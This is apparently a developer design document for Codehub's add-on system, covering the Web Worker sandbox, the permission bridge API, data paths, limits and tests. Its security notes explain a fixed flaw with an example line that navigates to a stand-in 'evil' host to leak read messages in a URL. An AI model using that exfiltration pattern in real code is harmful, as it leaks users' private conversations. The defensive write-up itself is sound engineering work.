# Add-ons (round 3, workstream `addons`)

Add-ons are small apps (one JavaScript file) that anyone can publish and that run beside a conversation.
Since the round 3 security fixes their code runs in a **Web Worker** inside a locked-down sandbox frame
(add-on runtime 2, `lib/runtime.js`): it has no DOM, no network and no way to navigate, draws its UI by
handing HTML to `codehub.ui.render()` (sanitized by Codehub), and talks to Codehub only through a
permission-checked bridge (the global `codehub`). Code: `src/features/addons/` (registrations in
`register.jsx`, pure logic in `lib/`, UI in `components/`, first-party examples in `examples/`). Rule
bytes used: **0** (generic blocks only; the runtime fix added leaf fields, no rules).

Not to be confused with the add-on shop's cosmetics (themes, badges; Settings → Shop items): these are
"Add-on apps" in Settings.

## Features

### 4. Add-on builder and public directory

- **Purpose.** Command palette "Create an add-on" / "Browse add-ons" (`paletteActions`), the
  "Browse add-ons" button in the chat panel and Settings → Add-on apps open the hub dialog (mounted
  once via `appMounts`, loaded lazily): **Directory** (search, sort by newest or name, details),
  **Your add-ons** (your published ones: view, edit) and **Create** (the builder).
- **Builder.** Name (≤ 48), icon (an emoji or ≤ 8 characters), version (`major.minor.patch`; an
  update that changes code or permissions must raise it), description (≤ 500), permissions from the
  fixed list, and a CodeMirror editor (JavaScript mode, same base setup and one-dark theme as the
  collab editor, own lazy chunk) for the code (≤ 64 KB UTF-8; code that starts like an HTML page is
  refused with a pointer to `codehub.ui.render`). "Start from…" offers a hello template and the two
  examples. A live preview runs the code in the same runtime with a **mock bridge**: sample
  conversation, in-memory storage, `insertText` / `sendMessage` only logged, console output, unhandled
  rejections and uncaught errors (with the add-on's own line numbers) shown in a log. Publishing stamps
  the manifest with the runtime version (`rt: 2`). Editing an add-on written for the old runtime shows
  a note asking for a rewrite.
- **Details** show icon, name, version, publisher (with the app-admin chip), date, size, description,
  the **permissions with what each one means (before install)**, the code checksum, "Try with sample
  data" (the mock-bridge preview of the published code), Install / Review update / Uninstall (a listing
  for the old runtime shows "needs update for the new add-on runtime" and can't be installed or tried),
  Report, and for the publisher Edit / Unpublish, for app admins "Remove (app admin)".
- **Report** uses the existing reports flow (`reports/{rid}` + `reportLog`, one per 30 s) with kind
  `addon` and target = the add-on id (`lib/report.js`; the integration pass added the kind to the
  rules). The admin reports queue shows such reports as "Add-on" with the add-on's name and a "Remove
  add-on" action (through the new `reportTargets` registry, see "Shared-file changes"). Reports filed
  before that (kind `shopItem`, target `addon:{id}`) are recognized the same way.
- **App-admin removal**: from the details view, the admin panel's "Add-ons" tab (list of all
  published add-ons) or the reports queue.

### 5. Personal add-ons panel and bridge

- **Purpose.** Install from the directory (the permissions dialog lets you untick any requested
  permission; calls that need an unticked one fail with `PERMISSION_DENIED`). The chat header button
  "Add-ons" (`chatHeaderButtons` → `chatPanels` id `addons`) lists your add-ons (and, in a server
  channel, the server's) and runs one in the panel. Settings → **Add-on apps** (`userSettingsTabs`
  id `addonApps`) lists installs (update review, "Send messages without asking me", uninstall),
  server add-ons you allowed (revoke, auto-send) and stored data (size, clear).
- **Runtime** (`lib/runtime.js`, `components/AddonFrame.jsx`). `SandboxFrame` (unchanged:
  `sandbox="allow-scripts"`, opaque origin, its CSP with `connect-src 'none'`) gets a document that
  contains **only Codehub's code**: DOMPurify (bundled from `dompurify/dist/purify.min.js`) and the host
  script, both pinned by `sha256` hashes in a second, stricter CSP meta (`script-src` = the two hashes,
  `worker-src blob:`, `connect-src 'none'`, `frame-src 'none'`, `form-action 'none'`, …). The host
  script opens the private channel to the app (below), checks that the frame's CSP reaches workers
  (a probe worker must find `eval` blocked; otherwise it refuses to start, since that would mean no
  network block), then starts the add-on in a dedicated **Worker** from a `blob:` URL: our SDK first,
  then the add-on's code in its own function scope. Workers inherit the frame's CSP (fetch, XHR,
  WebSocket, EventSource, `importScripts`, `import()` and nested workers are all blocked), have no DOM
  and cannot navigate anything.
- **UI** is declarative: `codehub.ui.render(html)` (≤ 262,144 characters) sends HTML to the host script,
  which sanitizes it with DOMPurify (no scripts or event-handler attributes; no `a`, `area`, `base`,
  `link`, `meta`, `iframe`, `frame`, `object`, `embed`, `template`; no `href`, `xlink:href`, `action`,
  `formaction`, `target`, `ping`, `srcset`, `srcdoc`, `autofocus`, …; URL attributes only `blob:`, or
  `data:` for images and media; `<style>` and inline `style` allowed, since the CSP blocks remote loads)
  and patches it into the frame at most once per animation frame. Patching keeps elements that stay
  the same (matched by tag and `id`/`data-key`), so focus, the caret, typed input, ticks and open
  `<details>` survive re-renders; such user state is only overwritten when the add-on renders a
  different value than last time. Events: elements with `data-on="click|input|change|submit"` and a
  `data-id` send `{ type, id, value?, checked? }` to `codehub.ui.on(handler)` (`value` of a form
  control, or for `submit` the form's named fields). The sandbox never submits forms, so a submit
  button click or Enter in a text field becomes a `submit` event. `codehub.ui.escape(text)` escapes text
  for HTML. The frame shows "This add-on stopped with an error: …" if the code throws before its first
  render. Theme tokens are applied to the frame's `<html>` as `--ch-<token>` variables and
  `data-theme`; the frame's body defaults to `--ch-bg-1` / `--ch-text`.
- **Bridge** (`lib/bridge.js`). The host script posts one hello `{ __addon: token, hello: 1 }` with a
  `MessageChannel` port to the app; the app accepts it only when `e.source` is that exact iframe's
  `contentWindow`, the per-frame random token (read by the host from a meta tag) matches, and no port
  is bound yet. The app then sends `{ event: 'start', src }` (the worker script) and the `init` event;
  every later call and reply goes over that private port, relayed by the host script to and from the
  worker. API (the global `codehub` in the worker, `version: 2`):
  - `ready()` → `{ context, theme, perms, scope }` (`context` is `null` without the `context`
    permission); `getContext()` (perm `context`) → `{ kind, name, me: { name }, scope }`; event
    `context` (perm `context`).
  - `getMessages(n)` (perm `readMessages`): the last `n ≤ 100` visible decrypted messages
    `{ id, author, text, ts }` (deleted, pending and undecryptable ones skipped; a code snippet is
    appended as a fenced block). Event `messages` `{ count }` when the conversation changes.
  - `insertText(text)` (perm `composer`, ≤ 4000 characters): into the composer at the caret.
  - `sendMessage(text)` (perm `send`, ≤ 4000, may not start with `/`, at most one per 3 s): a
    confirm dialog shows the **full text** every time (scrollable and keyboard-focusable, with its line
    and character count and a "scroll to read all of it" hint when it overflows), focuses "Don't send",
    and enables Send only after 1 s, unless the user ticked "Allow … to send without asking" for that
    add-on. The message goes through the normal send pipeline (send hooks such as AutoMod run) and
    carries `extra.addon = { id, name, icon }`; readers see a "via 🧩 Name" badge (`messageBadges`,
    validated and rendered as text).
  - `storage.get / set / remove / keys` (perm `storage`): JSON values, ≤ 32 KB per add-on.
  - `theme` / `getTheme()` / event `theme`: `{ mode: 'dark'|'light', tokens }` from the app's CSS
    variables (only plain `#hex` / `rgb()` values pass). Shop themes and theme switches are pushed live.
  - `ui.render(html)`, `ui.on(fn)` → `off()`, `ui.off(fn)`, `ui.escape(text)` (above); `on(event, fn)` →
    `off()`, `off(event, fn)`.
  - Every call is permission-checked, validated (types, lengths, JSON-only values, ≤ 70 KB per
    request) and rate-limited (token bucket: 30 burst, 10 per second); errors reject with
    `err.code` (`PERMISSION_DENIED`, `RATE_LIMITED`, `INVALID_ARGUMENT`, `CANCELLED`, `QUOTA_EXCEEDED`,
    `UNAVAILABLE`, `BUSY`, `UNKNOWN_METHOD`, `FAILED`).
  - Workers have timers (`setTimeout`, `setInterval`) but no audio, DOM or `eval`.
- **Pinning.** Installing pins the reviewed code: its SHA-256 goes into the install record and a copy
  of the code into `addonPin`. The runner loads the pinned copy and refuses it unless it hashes to the
  pinned sha. When the publisher changes the code, you keep running the approved version; the panel,
  the settings tab and the details view show "Update available" and a review dialog (version and
  publisher, added and removed permissions, newly requested permissions unticked by default, line diff
  against the pinned copy) re-pins it on "Accept update". An update published by a different account
  than the approved copy, or still written for the old runtime, can't be accepted.
- **Removed add-ons stop.** The runner watches the live listing (`pub/addons/{id}`) and refuses to run
  a personal or server install (`runBlock` in `lib/manifest.js`, checked again whenever the listing
  changes, so an open add-on closes at once) when the listing is **gone** (unpublished by its publisher
  or removed by an app admin: "Removed from the directory"), when its `by` is **not the publisher
  recorded at install** ("Publisher changed": the id was re-created by someone else), or when the
  approved copy targets an **older runtime** ("Needs update for the new add-on runtime", with "Review
  update" once the publisher has published a runtime-2 version). Lists, the chat panel and the settings
  tabs show the same reasons as chips; personal installs offer Uninstall.

### 6. Server add-ons

- **Purpose.** Server settings → **Add-ons** (`serverSettingsTabs`, visible with `manageApps`):
  install from the directory with the permissions the installer grants, review updates (same
  dialog), uninstall. While a server is open, an `appMounts` entry registers one channel-header
  button and chat panel per installed add-on (first 4; all of them are in the "Add-ons" panel),
  labelled "Name (add-on)". Each member's first open shows the granted permissions and asks for
  consent ("Allow and open"); consent is stored per member and asked again when the server grants
  permissions the member hasn't accepted. Members who aren't managers can't change anything.
- **Examples** (worker JavaScript, version 2.0.0). `examples/pomodoro.js` ("Pomodoro timer",
  `storage`: focus/break timer that keeps its end time in storage, so it keeps counting while closed;
  it announces the end of a session in a live region, since workers have no audio) and
  `examples/wordcloud.js` ("Channel word cloud", `readMessages`: top 40 words of the last 100 messages,
  refreshes on new messages; message text is escaped before rendering). An app admin publishes or updates them from Admin panel → **Add-ons** (`adminTabs`);
  they are then ordinary add-ons by that admin (manifest field `seed` lets the tab find them again; copies
published before the runtime change show "Update in directory").

## Data paths

| Path | Shape | Who |
|---|---|---|
| `pub/addons/{id}` | `{ name, icon, version, sha, size, rt: 2, perms?: 'context,readMessages,composer,send,storage', desc?, seed?, by, ts }` | public catalog: signed-in read; publisher writes; publisher or app admin deletes. `rt` = add-on runtime (missing = 1, the old document model) |
| `pub/addonCode/{id}` | `{ code (≤ 65536 chars), sha, by, ts }` | same; written in the same update as the manifest |
| `udata/{me}/addons/{id}` | `{ sha, perms?, at, v, name, icon, publisher, rt, auto? }` | my install (pinned sha, granted permissions, the publisher and runtime of the pinned code) |
| `udata/{me}/addonPin/{id}` | `{ sha, n, c0…c(n-1) }` (≤ 16000-char chunks) | my approved copy of the code |
| `udata/{me}/addonStore/{key}` | `{ iv, n, c0… }` = `sealForMe` box, ciphertext chunked | add-on storage; key `{id}` (personal) or `{sid}~{id}` (server add-on) |
| `udata/{me}/addonConsent/{sid}~{id}` | `{ sha, perms?, at, auto? }` | my consent to a server add-on |
| `sconf/{sid}/addons/{id}` | `{ sha, perms?, by (installer), at, v, name, icon, publisher, rt }` | server install; members read, `manageApps` writes |
| `sconf/{sid}/addonPin/{id}` | `{ sha, n, c0… }` | the server's approved copy |
| `reports/{rid}` | `{ by, kind: 'addon', target: '{id}', reason, note?, ts }` | existing reports flow |

Writes: publish/edit = one update of both `pub` entries; unpublish = one update nulling both;
install = one update of the install record + pin; uninstall (personal) also deletes the stored data.

## AAD strings

| Kind | Used for |
|---|---|
| `addonstore:{uid}/{key}` | add-on storage map, `sealForMe` (vault key); `{key}` = `{id}` or `{sid}~{id}` |

Everything else here is plaintext by design: the directory is public, and install/pin/consent records
contain only public data (ids, checksums, permission names, the public name/icon/version) in the
owner-only `udata` or member-only `sconf` blocks.

## Security notes

- **Runtime 2 (round 3 security fix A1).** Before, add-on code ran in the sandboxed document itself. A
  sandboxed frame can always navigate itself and CSP can't stop that, so an add-on holding
  `readMessages` could read messages and leak them in a URL (`location = 'https://evil/?d=…'`; a 204
  answer even kept the "stop on second load" guard from firing). Now no add-on code ever runs in a
  document: the frame holds only Codehub's two scripts (pinned by hash, so even a sanitizer bypass
  can't run script there), the add-on runs in a Worker (no DOM, no navigation) that inherits
  `connect-src 'none'` and the rest of the CSP, and the UI it sends is sanitized so nothing rendered
  can navigate, submit, embed a page or load from the network. The host refuses to start add-ons in a
  browser that doesn't apply the frame's CSP to workers. The app still closes a frame that loads a
  second document (defense in depth). Workers run off the main thread, and renders are applied at most
  once per frame, so a busy add-on can't freeze the app.
- **What add-ons can still do** (stated in the permission texts): show you what they read; insert text
  into your composer (`composer`; nothing is sent until you press Enter); post as you (`send`, after the
  confirmation unless you turned it off); keep 32 KB of data encrypted for you (`storage`). Never type
  secrets into an add-on's panel: its UI is the publisher's.
- **Removal (A3).** Removing a listing (publisher or app admin) stops every install from running, and a
  listing re-created under the same id by another account is refused (the install records the
  publisher). Installs from before the runtime change have no recorded publisher; they can't run until
  updated, and their update dialog names the publisher.
- **Consent and context (a1, a2).** The send confirmation shows the whole message with its line and
  character count, starts on "Don't send" and arms Send after 1 s (so a click aimed at the add-on can't
  land on it). The viewer's name and the conversation name are only handed out with the `context`
  permission ("See where it's open"), shown at install and on server consent.
- **Bridge binding.** Only the first hello from the exact iframe window with the per-render token
  binds a private `MessageChannel`; nothing else on `window` is listened to. The worker can only talk to
  the host script, which relays calls (`{ id, method, args }`), console lines and nothing else.
- **Untrusted data.** Manifests, code records, installs and consents are parsed and validated on read
  (`lib/manifest.js`: lengths, characters, version format, sha format, known permission names only;
  anything off is dropped). Before running or pinning, the manifest and code record must have the
  **same `by`**, the same `sha`, and the code must **hash to that sha**; pinned copies are re-hashed
  on every load. `m.body.addon` badges are type-checked and rendered as text.
- **Consent.** Personal installs show the permissions before install; server add-ons show them to
  every member on first open and again when permissions grow; `sendMessage` asks every time unless
  the user opted out for that add-on (Settings → Add-on apps can turn it back on).
- **Encryption.** Add-on storage is sealed with the user's vault key (AAD above), so only the user
  can read it. Messages an add-on reads are decrypted locally and handed to the worker only with
  `readMessages`; messages it sends are encrypted like any other message.
- **No server.** Add-ons run in the browser of the user who opens them; nothing runs when nobody has
  one open.

## Limits

| Limit | Enforced by |
|---|---|
| Code ≤ 64 KB (65536 UTF-8 bytes; `code` ≤ 65536 chars), JavaScript (no HTML page) | builder + rules (`pub` `code` field) |
| `ui.render` HTML ≤ 262,144 characters, applied at most once per animation frame | worker SDK + host script |
| Name ≤ 48, icon ≤ 8, description ≤ 500, version `x.y.z` | builder + read-side validation (rules: strings ≤ 20000) |
| `ts` = server time on every `pub` write; only the publisher edits; publisher or app admin deletes | rules |
| 20 published add-ons per user | UI only (rules can't count) |
| Storage ≤ 32 KB of JSON per add-on (sealed, chunked into ≤ 16000-char fields) | bridge (rules: 20000 per field) |
| `getMessages` ≤ 100, text ≤ 4000, ≤ 70 KB per call, 30-call burst / 10 per s, one send per 3 s; Send armed after 1 s | bridge + runner |
| Header buttons for the first 4 server add-ons | UI |

## Shared-file changes (for the integrator)

- `src/components/admin/AdminPanel.jsx`: renders entries of a new **`adminTabs`** registry
  (`{ id, label, render({ me }) }`) after the built-in tabs (additive).
- `src/components/admin/ReportsQueue.jsx`: entries of a new **`reportTargets`** registry
  (`{ id, label, match(report), render(report), actions?(report, { act, dismiss, busy }) }`) take over
  the kind pill, target line and extra actions of matching reports (additive). Bots use it too.

## Integration notes (round 3 security fixes)

- New leaf fields: `rt` on `pub/addons/{id}` and `publisher` + `rt` on install records
  (`udata/{me}/addons/{id}`, `sconf/{sid}/addons/{id}`). No rule change here; a field-name allowlist on
  `pub/$kind/$id/$f` (sec-misc) must include `rt` for add-on manifests, or publishing fails (the
  add-ons rules test publishes with `rt` and would catch it).
- New permission name `context` in the `perms` strings (old clients refuse manifests that use it).
- `src/lib/sandbox.js` and `SandboxFrame` are unchanged; the add-on frame stacks its own stricter CSP.

## Tests

- `tests/unit/addons.test.mjs`: manifests (runtime field, `context` permission, HTML-page code
  refused), permissions, chunking, SHA-256, rate limiter, bridge host (permissions incl. `getContext`,
  validation, send rules, quota), the frame document (only our two scripts, hashes match, strict CSP),
  the worker SDK against the real bridge host in a `vm` context with string code generation off (calls,
  context gating, `ui.render`/`ui.on`/`escape`, console forwarding, add-on globals can't break the SDK),
  both examples running in that worker, `runBlock`/`updateBlock` (removed, other publisher, old
  runtime) and the send confirmation's text stats.
- `tests/rules/addons.test.mjs`: every write the store makes on `pub` (with `rt`), `udata`, `sconf`
  (with `publisher`/`rt`) and the report; nobody can take over an existing add-on id.
- `tests/e2e/42-addons.spec.mjs`: builder preview → publish → install → every bridge call (send
  confirmation with a 31-line message: full text, counts, Send disabled for 1 s, focus on "Don't send";
  badge; encrypted storage across reload) → **every network and navigation attempt from add-on code
  fails** (fetch, XHR, WebSocket, EventSource, `importScripts`, `import()`, nested worker, `location`;
  a real local server receives nothing) and dangerous markup is sanitized (links, meta refresh, iframe,
  remote images, inline handlers; forms only produce events) → an old-runtime install shows "needs
  update" and doesn't run → uninstall; admin seeding, both examples running in the new runtime
  (Pomodoro keeps focus across re-renders and its state in storage; word cloud reads the channel),
  report → admin removal stops the open word cloud at once and it won't start again; server install,
  member consent, publisher update pinned until a manager accepts it, then unpublishing stops it for
  members.
